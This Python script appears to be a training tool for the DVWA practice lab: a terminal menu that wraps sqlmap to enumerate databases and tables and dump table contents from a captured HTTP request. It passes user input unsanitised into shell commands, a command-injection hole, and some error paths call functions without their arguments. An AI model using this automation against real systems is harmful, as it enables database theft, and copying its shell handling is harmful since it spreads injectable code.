import subprocess
from colorama import Fore, Style
import shutil
import os
import time
import subprocess
import re
    
# =========================================================================================

def execute_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    while True:
        output = process.stdout.readline()
        if output == b'' and process.poll() is not None:
            break
        if output:
            print(Fore.WHITE + output.strip().decode())
    rc = process.poll()
    return rc
        
def option_1():
    
    scanDataBase()

def execute_sqlmap_command(commandSqlmapScanDumpAll, msg):
    if os.path.exists("tmp.sh"):
        execute_command("rm tmp.sh")
    
    execute_command("touch tmp.sh")
    execute_command(f'echo "{commandSqlmapScanDumpAll}" >> tmp.sh')  # Write to tmp.sh, not filename.txt
    execute_command("chmod +x tmp.sh")  # Make tmp.sh executable
    
    print(Fore.RED + f"\n{msg}\n" + Style.RESET_ALL)
         
def scanDataBase():
    
    httpRequest = " "
    directoryPath = "../SQLmap/"
    
    os.system('clear') 
    print(Fore.GREEN + "DVWA SQL Injection level segurity LOW\n" + Style.RESET_ALL)
    print(Fore.BLUE + "\"Scan Database with sqlmap\"\n" + Style.RESET_ALL)
    
    print(Fore.RED + "Place your HTTP request in the SQLmap folder\n" + Style.RESET_ALL)
    input(Fore.WHITE + "Press Enter to continue...\n" + Style.RESET_ALL)
    
    execute_command("ls " + directoryPath)
    
    httpRequest = input(Fore.WHITE + "\nSelect your HTTP request in txt: " + Style.RESET_ALL)
    commandSqlmapScanDataBase = "sqlmap -r " + directoryPath + httpRequest + " --dbs  | grep -oP '\[\*\] \K\S+$'"
    
    execute_command("clear")
    
    execute_sqlmap_command(commandSqlmapScanDataBase, "[DB] Databases Found: ")
     
    if os.path.exists(os.path.join(directoryPath, httpRequest)) and httpRequest.endswith(".txt"):
        execute_command("./tmp.sh")
        execute_command("rm tmp.sh")
        print(Fore.RED + "\n---------------------\n" + Style.RESET_ALL)
        scanTables(directoryPath, httpRequest)
        return 
    else:
        print("The file does not exist in the folder or is not in text format.")
        return

def scanTables(directoryPath, httpRequest):
    
    database = input(Fore.WHITE + "Select the database you want to attack: " + Style.RESET_ALL)
    commandSqlmapScanTables = f"sqlmap -r {directoryPath}{httpRequest} -D {database} --tables | grep -P '^\|\s*\w+\s*\|$' | awk -F '|' '{{print $2}}'"
    
    execute_sqlmap_command(commandSqlmapScanTables, "[TB] Tables Found: ")
    
    if database:
        execute_command("./tmp.sh")
        execute_command("rm tmp.sh")
        print("\n")
        scanDumpAll(directoryPath, httpRequest, database)
    else:
        print("Database is empty")
        scanTables()

def optionRunSqlmap():
    option = input(Fore.WHITE + "Do you want to continue using SQLmap? (y/n): " + Style.RESET_ALL)
        
    if option == "y":
        scanDataBase()
    if option == "n":
        main_menu()
    else:
        print("Invalid option")
        optionRunSqlmap()
    
def scanDumpAll(directoryPath, httpRequest, database):
    
    table = input(Fore.WHITE + "Select the table to view the data: " + Style.RESET_ALL)
    # print(table)
    commandSqlmapScanDumpAll = f"sqlmap -r {directoryPath}{httpRequest} -D {database} -T {table} --dump-all"
    # print(commandSqlmapScanDumpAll)
    execute_sqlmap_command(commandSqlmapScanDumpAll, "[DT] Dumping data from the table: ")
    
    if table:
        execute_command("./tmp.sh")
        execute_command("rm tmp.sh")
        print("\n")
        optionRunSqlmap()
    else:
        print("Database is empty")
        scanDumpAll()
    
# =========================================================================================

def print_centered(message):
    terminal_width = shutil.get_terminal_size().columns
    print(message.center(terminal_width))

def print_menu():
    terminal_height = shutil.get_terminal_size().lines
    padding = int((terminal_height - 14) / 2)  # 4 is the number of menu lines
    print('\n' * padding)
    print_centered(Fore.YELLOW + "SQL Injetion DVWA")
    print_centered(Fore.LIGHTRED_EX + "Select Difficulty Level")
    print("\n")
    print_centered(Fore.LIGHTWHITE_EX + "--------------------- ")
    print_centered(Fore.LIGHTWHITE_EX + "|                   | ")
    print_centered(Fore.LIGHTWHITE_EX + "| 1. Low            | ")
    print_centered(Fore.LIGHTWHITE_EX + "|                   | ")
    print_centered(Fore.LIGHTWHITE_EX + "| 2. Medium         | ")
    print_centered(Fore.LIGHTWHITE_EX + "|                   | ")
    print_centered(Fore.LIGHTWHITE_EX + "| 3. High           | ")
    print_centered(Fore.LIGHTWHITE_EX + "|                   | ")
    print_centered(Fore.LIGHTWHITE_EX + "| 4. Exit           | ")
    print_centered(Fore.LIGHTWHITE_EX + "|                   | ")
    print_centered(Fore.LIGHTWHITE_EX + "--------------------- ")
    print('\n' * padding)
def option_2():
    print_centered(Fore.BLUE + "You selected Option 2" + Style.RESET_ALL)

def option_3():
    print_centered(Fore.YELLOW + "You selected Option 3" + Style.RESET_ALL)

def exit_program():
    print_centered(Fore.RED + "Exiting the program" + Style.RESET_ALL)
    return False

def invalid_choice():
    print_centered(Fore.RED + "Invalid choice. Please enter a number between 1 and 4." + Style.RESET_ALL)

def main_menu():
    while True:
        os.system('clear')  # Clear the terminal
        
        print_menu()
        
        os.system('clear')  # Clear the terminal
        
        print_menu()

        choice = input("Enter your choice: ")

        switcher = {
            "1": option_1,
            "2": option_2,
            "3": option_3,
            "4": exit_program
        }

        # Get the function from switcher dictionary with the choice as the key, default to invalid_choice
        func = switcher.get(choice, invalid_choice)
        
        # Execute the function
        if not func():
            break

if __name__ == "__main__":
    main_menu()